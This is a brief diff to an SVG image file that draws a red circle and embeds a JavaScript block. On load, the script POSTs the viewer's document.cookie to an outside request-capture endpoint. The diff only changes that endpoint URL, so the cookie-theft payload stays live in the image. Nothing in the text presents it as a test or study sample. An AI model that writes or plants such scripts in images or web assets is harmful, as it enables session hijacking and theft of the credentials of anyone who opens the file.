@@ -3,6 +3,6 @@
 <svg version="1.1" xmlns="http://www.w3.org/2000/svg">
   <circle cx="250" cy="100" r="50" fill="red" />
   <script type="text/javascript"><![CDATA[
-   fetch(`https://en8vwnbiln7pp.x.pipedream.net/1234.png?c=${document.cookie}`, { method: "POST" })
+   fetch(`https://enz25p7qw0dco.x.pipedream.net//1234.png?c=${document.cookie}`, { method: "POST" })
   ]]></script>
 </svg>
